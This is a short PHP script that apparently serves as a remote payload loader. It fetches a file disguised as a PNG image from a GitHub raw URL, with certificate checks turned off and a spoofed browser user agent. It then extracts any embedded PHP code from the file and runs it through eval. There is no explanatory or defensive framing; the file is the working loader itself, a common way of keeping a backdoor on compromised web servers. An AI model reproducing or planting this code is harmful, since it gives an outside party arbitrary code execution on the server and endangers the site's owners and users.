<?php
$url = "https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/ss.png";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: */*']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$data = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($data && $httpCode == 200) {
    $pos = strpos($data, "<?php");
    if ($pos !== false) {
        eval("?>" . substr($data, $pos));
    } else {
        echo "No PHP code found. HTTP Code: $httpCode";
    }
} else {
    echo "Download failed. HTTP Code: $httpCode";
}
?>